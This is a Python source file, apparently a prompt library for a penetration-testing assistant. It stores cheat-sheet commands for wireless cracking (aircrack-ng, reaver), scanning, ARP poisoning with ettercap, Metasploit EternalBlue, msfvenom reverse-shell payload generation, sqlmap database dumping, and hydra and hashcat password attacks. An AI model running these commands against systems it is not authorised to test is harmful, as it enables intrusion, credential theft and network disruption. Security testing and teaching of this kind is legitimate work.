#!/usr/bin/env python3
# PAW Prompts Library
# Contains prompt templates and information for various tools

# Dictionary of aircrack-ng related prompts and information
AIRCRACK_PROMPTS = {
    "general": "The aircrack-ng suite is a set of tools for auditing wireless security. Key tools include airmon-ng (interface management), airodump-ng (packet capture), aireplay-ng (packet injection), and aircrack-ng (key cracking).",
    
    "airmon-ng": {
        "description": "Tool for setting up monitor mode on wireless interfaces",
        "usage": "airmon-ng [check|check kill|start|stop] [interface]",
        "examples": [
            "airmon-ng                       # List wireless interfaces",
            "airmon-ng check                 # Check for interfering processes",
            "airmon-ng check kill            # Kill interfering processes",
            "airmon-ng start wlan0           # Enable monitor mode on wlan0",
            "airmon-ng stop wlan0mon         # Disable monitor mode"
        ]
    },
    
    "airodump-ng": {
        "description": "Tool for packet capture and network discovery",
        "usage": "airodump-ng [options] <interface>",
        "examples": [
            "airodump-ng wlan0mon                            # Scan all networks",
            "airodump-ng --bssid 00:11:22:33:44:55 wlan0mon  # Target specific AP",
            "airodump-ng -c 1 wlan0mon                       # Filter by channel",
            "airodump-ng -w capture --bssid [MAC] wlan0mon   # Write to file"
        ]
    },
    
    "aireplay-ng": {
        "description": "Tool for packet injection attacks",
        "usage": "aireplay-ng [options] <interface>",
        "examples": [
            "aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon  # Deauth attack",
            "aireplay-ng -1 0 -e [ESSID] -a [AP_MAC] wlan0mon        # Fake authentication",
            "aireplay-ng -3 -b [AP_MAC] wlan0mon                     # ARP replay attack"
        ]
    },
    
    "aircrack-ng": {
        "description": "Tool for cracking WEP and WPA-PSK keys",
        "usage": "aircrack-ng [options] <capture files>",
        "examples": [
            "aircrack-ng capture*.cap                         # Basic cracking",
            "aircrack-ng -b 00:11:22:33:44:55 capture*.cap    # Target specific AP",
            "aircrack-ng -w wordlist.txt -b [MAC] capture*.cap # Use wordlist"
        ]
    },
    
    "wifite": {
        "description": "Automated wireless auditing tool",
        "usage": "wifite [options]",
        "examples": [
            "wifite                                # Basic scan and attack",
            "wifite -i wlan0mon                    # Use specific interface",
            "wifite -mac                           # Enable MAC randomization",
            "wifite -5                             # Attack 5GHz networks too"
        ]
    },
    
    "reaver": {
        "description": "WPS brute force attack tool",
        "usage": "reaver -i <interface> -b <bssid> [options]",
        "examples": [
            "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv       # Basic WPS attack",
            "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv  # Specify channel",
            "reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1 -vv  # Use PixieWPS attack"
        ]
    }
}

# Dictionary of network-related prompts and information
NETWORK_PROMPTS = {
    "general": "Network reconnaissance and manipulation involves various tools for discovery, scanning, and analysis of network traffic and devices.",
    
    "scanning": {
        "description": "Tools and techniques for network discovery and port scanning",
        "common_tools": ["nmap", "masscan", "netdiscover", "arp-scan"],
        "examples": [
            "nmap -sS -p 1-65535 192.168.1.0/24     # Full SYN scan of network",
            "nmap -sV -O -p 80,443,22 target.com    # Service and OS detection",
            "netdiscover -r 192.168.1.0/24          # ARP-based host discovery"
        ]
    },
    
    "packet_capture": {
        "description": "Tools for capturing and analyzing network packets",
        "common_tools": ["tcpdump", "wireshark", "tshark"],
        "examples": [
            "tcpdump -i eth0 -w capture.pcap         # Capture all traffic on eth0",
            "tcpdump -i eth0 host 192.168.1.5        # Filter by host",
            "tcpdump -i eth0 port 80                 # Filter by port"
        ]
    },
    
    "wifi": {
        "description": "Tools for wireless network analysis",
        "common_tools": ["iwconfig", "iw", "wavemon", "kismet", "aircrack-ng suite", "wifite", "reaver"],
        "examples": [
            "iwconfig wlan0                          # Display wireless settings",
            "iw dev wlan0 scan                       # Scan for networks",
            "kismet -c wlan0                         # Start Kismet wireless monitor"
        ]
    },
    
    "sniffing": {
        "description": "Tools for eavesdropping on network traffic",
        "common_tools": ["wireshark", "tcpdump", "tshark", "ettercap", "bettercap"],
        "examples": [
            "wireshark                               # Start GUI packet analyzer",
            "ettercap -T -q -M arp:remote /192.168.1.1/ /192.168.1.100/  # ARP poisoning attack",
            "bettercap -iface eth0                   # Start the interactive session"
        ]
    },
    
    "vulnerability_scanning": {
        "description": "Tools for identifying vulnerabilities in systems and applications",
        "common_tools": ["nmap scripts", "nikto", "wpscan", "sqlmap", "OpenVAS"],
        "examples": [
            "nmap -sV --script=vuln 192.168.1.10     # Run vulnerability scripts",
            "nikto -h http://target.com              # Scan web server",
            "wpscan --url http://wordpress-site.com  # Scan WordPress site"
        ]
    }
}

# Dictionary for exploitation tools and techniques
EXPLOITATION_PROMPTS = {
    "general": "Exploitation involves using tools to leverage vulnerabilities in systems, applications, or networks to gain unauthorized access or control.",
    
    "metasploit": {
        "description": "Framework for developing, testing, and executing exploits",
        "usage": "msfconsole [options]",
        "common_modules": ["exploit/", "auxiliary/", "post/", "payload/"],
        "examples": [
            "msfconsole                               # Start Metasploit console",
            "search type:exploit platform:windows     # Search for Windows exploits",
            "use exploit/windows/smb/ms17_010_eternalblue  # Select exploit",
            "set RHOSTS 192.168.1.10                  # Set target",
            "exploit                                  # Launch exploit"
        ]
    },
    
    "msfvenom": {
        "description": "Payload generator and encoder",
        "usage": "msfvenom -p <payload> [options]",
        "examples": [
            "msfvenom -l payloads                     # List available payloads",
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe  # Windows payload",
            "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf  # Linux payload"
        ]
    },
    
    "sqlmap": {
        "description": "Automated SQL injection tool",
        "usage": "sqlmap -u <url> [options]",
        "examples": [
            "sqlmap -u 'http://target.com/page.php?id=1'  # Basic scan",
            "sqlmap -u 'http://target.com/page.php?id=1' --dbs  # List databases",
            "sqlmap -u 'http://target.com/page.php?id=1' -D dbname -T users --dump  # Dump users table"
        ]
    },
    
    "hydra": {
        "description": "Password brute-forcing tool for various services",
        "usage": "hydra -l <login> -P <password list> <target> <service>",
        "examples": [
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10  # SSH brute force",
            "hydra -L users.txt -P passwords.txt ftp://192.168.1.10  # FTP brute force with multiple users",
            "hydra -l admin -P passwords.txt http-post-form '/:username=^USER^&password=^PASS^:F=Login incorrect'  # Web form"
        ]
    }
}

# Password cracking and wordlist tools
PASSWORD_PROMPTS = {
    "general": "Password cracking involves using various tools and techniques to recover or bypass passwords used for authentication.",
    
    "hashcat": {
        "description": "Advanced password recovery utility",
        "usage": "hashcat [options] hashfile [wordlists|masks]",
        "hash_modes": {
            "0": "MD5", 
            "100": "SHA1",
            "1000": "NTLM",
            "1800": "sha512crypt",
            "2500": "WPA/WPA2"
        },
        "examples": [
            "hashcat -m 0 -a 0 hashes.txt wordlist.txt  # MD5 wordlist attack",
            "hashcat -m 2500 -a 0 capture.hccapx wordlist.txt  # WPA/WPA2 cracking",
            "hashcat -m 1800 -a 3 hashes.txt ?a?a?a?a?a?a  # sha512crypt brute force"
        ]
    },
    
    "john": {
        "description": "John the Ripper password cracker",
        "usage": "john [options] [password-files]",
        "examples": [
            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # Wordlist attack",
            "john --format=raw-md5 hashes.txt  # Specify hash format",
            "john --show hashes.txt  # Show cracked passwords"
        ]
    },
    
    "crunch": {
        "description": "Wordlist generator tool",
        "usage": "crunch <min-len> <max-len> [charset] [options]",
        "examples": [
            "crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wordlist.txt  # 8-char alphanumeric",
            "crunch 4 6 abcdef123456 -o wordlist.txt  # 4-6 chars with specific charset",
            "crunch 8 8 12345 -t @@@@@%%%  # With pattern (@ = lowercase alpha, % = number)"
        ]
    }
}

# Web application assessment tools
WEB_PROMPTS = {
    "general": "Web application assessment involves using specialized tools to identify vulnerabilities and weaknesses in web applications.",
    
    "burpsuite": {
        "description": "Integrated platform for web application security testing",
        "components": ["Proxy", "Spider", "Scanner", "Intruder", "Repeater", "Sequencer", "Decoder", "Comparer"],
        "examples": [
            "Configure browser to use Burp Proxy (127.0.0.1:8080)",
            "Capture and modify HTTP/HTTPS traffic",
            "Automated scanning for vulnerabilities",
            "Manual testing with specialized tools"
        ]
    },
    
    "nikto": {
        "description": "Web server scanner for dangerous files and outdated server components",
        "usage": "nikto -h <host> [options]",
        "examples": [
            "nikto -h http://target.com  # Basic scan",
            "nikto -h http://target.com -p 443 -ssl  # HTTPS scan",
            "nikto -h http://target.com -Tuning 9  # XSS Checks"
        ]
    },
    
    "gobuster": {
        "description": "Directory/file and DNS busting tool",
        "usage": "gobuster [mode] [options]",
        "modes": ["dir", "dns", "vhost", "s3", "fuzz"],
        "examples": [
            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt  # Directory scan",
            "gobuster dns -d target.com -w list.txt  # Subdomain enumeration",
            "gobuster vhost -u http://target.com -w vhosts.txt  # Virtual host discovery"
        ]
    },
    
    "wpscan": {
        "description": "WordPress vulnerability scanner",
        "usage": "wpscan --url <url> [options]",
        "examples": [
            "wpscan --url http://wordpress-site.com  # Basic scan",
            "wpscan --url http://wordpress-site.com --enumerate u  # Enumerate users",
            "wpscan --url http://wordpress-site.com --plugins-detection aggressive  # Thorough plugin check"
        ]
    }
}

if __name__ == "__main__":
    # Test print some information
    print("Aircrack-ng Suite Information:")
    print(AIRCRACK_PROMPTS["general"])
    print("\nExample airmon-ng commands:")
    for example in AIRCRACK_PROMPTS["airmon-ng"]["examples"]:
        print(f"  {example}")
    
    print("\nMetasploit Framework Information:")
    print(EXPLOITATION_PROMPTS["metasploit"]["description"])
    print("\nExample Metasploit commands:")
    for example in EXPLOITATION_PROMPTS["metasploit"]["examples"]:
        print(f"  {example}") 